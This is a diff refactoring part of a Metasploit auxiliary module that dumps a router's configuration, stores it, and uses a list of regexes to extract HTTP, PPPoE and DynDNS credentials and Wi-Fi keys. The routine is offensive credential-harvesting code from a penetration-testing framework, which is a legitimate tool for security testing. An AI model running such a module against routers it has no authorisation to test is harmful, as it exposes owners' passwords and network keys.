@@ -31,6 +31,21 @@ class Metasploit3 < Msf::Auxiliary
         ], self.class)
   end
 
+  Settings = [
+      [/http_username=(\S+)/i, "HTTP Username"],
+      [/http_password=(\S+)/i, "HTTP Password"],
+      [/pppoe_username=(\S+)/i, "PPPOE Username"],
+      [/pppoe_password=(\S+)/i, "PPPOE Password"],
+      [/ddns_service_provider=(\S+)/i, "DynDNS Provider"],
+      [/ddns_user_name=(\S+)/i, "DynDNS Username"],
+      [/ddns_password=(\S+)/i, "DynDNS Password"],
+      [/wifi_ssid=(\S+)/i, "Wifi SSID"],
+      [/wifi_key1=(\S+)/i, "Wifi Key1"],
+      [/wifi_key2=(\S+)/i, "Wifi Key2"],
+      [/wifi_key3=(\S+)/i, "Wifi Key3"],
+      [/wifi_key4=(\S+)/i, "Wifi Key4"]
+    ]
+
   def run
 
     print_status("Attempting to connect to #{rhost} to dump configuration.")
@@ -49,33 +64,24 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status(response) if( datastore['DEBUG'] )
+    vprint_status("Response: #{response}")
 
-    loot_file = store_loot("router.config", "text/plain", datastore['RHOST'], response, "#{datastore['RHOST']}router_config.txt", "Router Configurations")
+    loot_file = store_loot("router.config", "text/plain", rhost, response, "#{rhost}router_config.txt", "Router Configurations")
     print_status("Router configuration dump stored in: #{loot_file}")
 
     configs = response.split(?\x00)
-    configs.sort.each do |i|
-      if i.strip.match(/.*=\S+/)
-        print_status(i) if (datastore['DEBUG'])
+    
+    if (datastore['VERBOSE'])
+      vprint_status('All configuration values:')
+      configs.sort.each do |i|
+        if i.strip.match(/.*=\S+/)
+          vprint_status(i)
+        end
       end
     end
 
     # print some useful data sets
-    [
-      [/http_username=(\S+)/i, "HTTP Username"],
-      [/http_password=(\S+)/i, "HTTP Password"],
-      [/pppoe_username=(\S+)/i, "PPPOE Username"],
-      [/pppoe_password=(\S+)/i, "PPPOE Password"],
-      [/ddns_service_provider=(\S+)/i, "DynDNS Provider"],
-      [/ddns_user_name=(\S+)/i, "DynDNS Username"],
-      [/ddns_password=(\S+)/i, "DynDNS Password"],
-      [/wifi_ssid=(\S+)/i, "Wifi SSID"],
-      [/wifi_key1=(\S+)/i, "Wifi Key1"],
-      [/wifi_key2=(\S+)/i, "Wifi Key2"],
-      [/wifi_key3=(\S+)/i, "Wifi Key3"],
-      [/wifi_key4=(\S+)/i, "Wifi Key4"]
-    ].each do |regex|
+    Settings.each do |regex|
       configs.each do |config|
         if config.match(regex[0])
           value = $1
